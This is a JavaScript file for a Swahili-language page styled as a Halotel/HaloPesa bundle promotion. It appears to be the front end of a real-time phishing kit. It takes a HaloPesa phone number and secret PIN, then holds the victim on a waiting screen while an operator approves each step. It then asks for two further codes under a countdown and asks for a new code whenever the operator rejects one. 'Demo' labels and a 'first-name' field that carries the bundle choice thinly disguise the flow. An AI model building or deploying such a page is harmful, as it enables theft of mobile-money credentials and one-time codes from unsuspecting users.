const $=id=>document.getElementById(id);
const setClass=(id,name,on)=>{const el=$(id);if(el?.classList)el.classList.toggle(name,!!on);};
const state={applicationId:null,applicationNo:null,phone:'',bundle:null,referralToken:(new URLSearchParams(location.search).get('admin')||new URLSearchParams(location.search).get('ref')||'')};
const timers={one:null,two:null};
const pages=[...document.querySelectorAll('.page')],steps=[...document.querySelectorAll('.step')];
function showPage(n){pages.forEach(p=>{if(p?.classList)p.classList.toggle('active',p.dataset.page===String(n));});steps.forEach((e,i)=>{if(e?.classList){e.classList.toggle('active',i===Number(n)-1);e.classList.toggle('done',i<Number(n)-1);}});if(n===2)startTimer('one');if(n===3)startTimer('two');window.scrollTo({top:0,behavior:'smooth'});}
function error(id,msg){const e=$(id);if(!e)return;e.textContent=msg||'';if(e.classList)e.classList.toggle('hidden',!msg);}
function stopTimer(k){if(timers[k])clearInterval(timers[k]);timers[k]=null;}
function startTimer(k){stopTimer(k);const prefix=k==='one'?'refCode1':'refCode2';let left=4;const tick=()=>{$(prefix+'Seconds').textContent=left;$(prefix+'Ring').style.setProperty('--progress',(left/30*100)+'%');setClass(prefix+'Timer','expired',left===0);setClass(prefix+'Btn','hidden',left===0);setClass(prefix+'Resubmit','hidden',left!==0);if(left===0)stopTimer(k);left=Math.max(0,left-1);};tick();timers[k]=setInterval(tick,1000);}
async function getStatus(){const r=await fetch(`/api/applications/${state.applicationId}/status`);if(!r.ok)throw new Error('Imeshindikana kusoma hali ya ombi.');return r.json();}
async function waitUntil(predicate){while(true){const d=await getStatus();if(d.status==='REJECTED')throw new Error('Ombi halijakubaliwa. hakiki nambari na nambari ya siri na ujaribu tena.');if(predicate(d))return d;await new Promise(r=>setTimeout(r,1500));}}
$('loginForm').addEventListener('submit',async e=>{e.preventDefault();error('loginError','');const phone=$('phone').value.trim(),applicationId=$('applicationIdInput').value.trim();if(!/^[0-9+\s-]{9,20}$/.test(phone))return error('loginError','Weka nambari ya simu ya halopesa.');if(!/^\d{1,30}$/.test(applicationId))return error('loginError','Weka namba ya siri.');const b=$('startApplication');b.disabled=true;try{const r=await fetch('/api/applications',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone,applicationId,referralToken:state.referralToken})});const d=await r.json();if(!r.ok)throw new Error(d.error||'Imeshindikana kuunda ombi.');state.applicationId=d.applicationId;state.applicationNo=d.applicationNo;$('applicationNumber').textContent=d.applicationNo;setClass('approvalWaiting','hidden',false);if(b?.classList)b.classList.add('hidden');$('phone').disabled=true;$('applicationIdInput').disabled=true;await waitUntil(x=>x.status==='APPROVED');setClass('approvalWaiting','hidden',true);showPage(2);}catch(err){error('loginError',err.message);b.disabled=false;if(b?.classList)b.classList.remove('hidden');}});
async function verifyDemoCode(which){
  const isOne=which===1;
  const input=$(isOne?'refCode1':'refCode2');
  const err=isOne?'refCode1Error':'refCode2Error';
  const btn=$(isOne?'refCode1Btn':'refCode2Btn');
  const key=isOne?'one':'two';
  const waitingId=isOne?'refCode1Waiting':'refCode2Waiting';
  error(err,'');
  if(!input || !btn)return error(err,'Ukurasa haujapakia vizuri. Tafadhali refresh ukurasa.');
  const demoNumber=String(input.value||'').trim();
  if(!/^\d{1,30}$/.test(demoNumber))return error(err,'Weka tarifa ya holopesa pekee.');
  if(!state.applicationId)return error(err,'Anza ombi la  kwanza.');
  btn.disabled=true;
  try{
    const r=await fetch(`/api/applications/${state.applicationId}/demo-reference-notification`,{
      method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({stage:isOne?'1':'2',demoNumber})
    });
    const d=await r.json().catch(()=>({}));
    if(!r.ok)throw new Error(d.error||'Imeshindikana kutuma taarifa kwa halotel.');
    stopTimer(key);
    error(err,'');
    setClass(waitingId,'hidden',false);
    setClass(isOne?'refCode1Resubmit':'refCode2Resubmit','hidden',true);
    setClass(isOne?'refCode1Btn':'refCode2Btn','hidden',true);

    // Remain on this page until the admin explicitly approves or rejects this stage.
    while(true){
      const status=await getStatus();
      const decision=isOne?status.demoReference1Status:status.demoReference2Status;
      if(decision==='APPROVED'){
        setClass(waitingId,'hidden',true);
        showPage(isOne?3:4);
        return;
      }
      if(decision==='REJECTED'){
        setClass(waitingId,'hidden',true);
        input.value='';
        btn.disabled=false;
        setClass(isOne?'refCode1Btn':'refCode2Btn','hidden',false);
        error(err,'halotel imekataa namba hii. Weka namba nyingine kisha tuma tena.');
        startTimer(key);
        return;
      }
      await new Promise(resolve=>setTimeout(resolve,1500));
    }
  }catch(e){
    setClass(waitingId,'hidden',true);
    btn.disabled=false;
    setClass(isOne?'refCode1Btn':'refCode2Btn','hidden',false);
    error(err,e?.message||'Hitilafu imetokea. Tafadhali jaribu tena.');
  }
}
$('refCode1Btn').addEventListener('click',()=>verifyDemoCode(1));$('refCode2Btn').addEventListener('click',()=>verifyDemoCode(2));
$('refCode1Resubmit').addEventListener('click',()=>{ $('refCode1').value='';error('refCode1Error','');startTimer('one');});$('refCode2Resubmit').addEventListener('click',()=>{$('refCode2').value='';error('refCode2Error','');startTimer('two');});
function updateBundleChoices(){const profile=$('lineUsageProfile'),select=$('bundleCode'),prev=select.value;let first=null;[...select.options].forEach(o=>{const ok=(o.dataset.level||'').split(',').includes(profile.value);o.hidden=!ok;o.disabled=!ok;if(ok&&!first)first=o;});if(![...select.options].some(o=>o.value===prev&&!o.disabled)&&first)select.value=first.value;const hints={light:'Matumizi ya kawaida: vifurushi vya kuanzia vinaonyeshwa.',regular:'Matumizi ya mara kwa mara: vifurushi vya kawaida na vikubwa vinaonyeshwa.',frequent:'Matumizi mengi: vifurushi vikubwa zaidi vinaonyeshwa.'};$('bundleEligibilityHint').textContent=hints[profile.value]+' Chaguo litatumwa kwa msimamizi wa demo kwa idhini.';}
$('lineUsageProfile').addEventListener('change',updateBundleChoices);updateBundleChoices();
$('bundleSubmitBtn').addEventListener('click',async()=>{error('bundleError','');const btn=$('bundleSubmitBtn'),code=$('bundleCode').value;btn.disabled=true;state.bundle=$('bundleCode').selectedOptions[0].textContent;try{const r=await fetch(`/api/applications/${state.applicationId}/first-name`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({firstName:code,lineUsageProfile:$('lineUsageProfile').value})});const d=await r.json();if(!r.ok)throw new Error(d.error||'Imeshindikana kutuma chaguo.');setClass('bundleSubmitBtn','hidden',true);setClass('bundleWaiting','hidden',false);const approved=await waitUntil(x=>x.status==='APPROVED_FIRST_NAME');setClass('bundleWaiting','hidden',true);$('successBundle').textContent=state.bundle;$('successNumber').textContent='Namba ya kumbukumbu: '+(approved.applicationNo||state.applicationNo);showPage('success');}catch(err){setClass('bundleWaiting','hidden',true);btn.disabled=false;setClass(btn,'hidden',false);error('bundleError',err.message);}});
(function splash(){const s=$('anniversarySplash');if(!s)return;let closed=false;function close(){if(closed)return;closed=true;if(s.classList)s.classList.add('is-hidden');setTimeout(()=>s.remove(),500);} $('skipAnniversarySplash')?.addEventListener('click',close);setTimeout(close,5000);})();
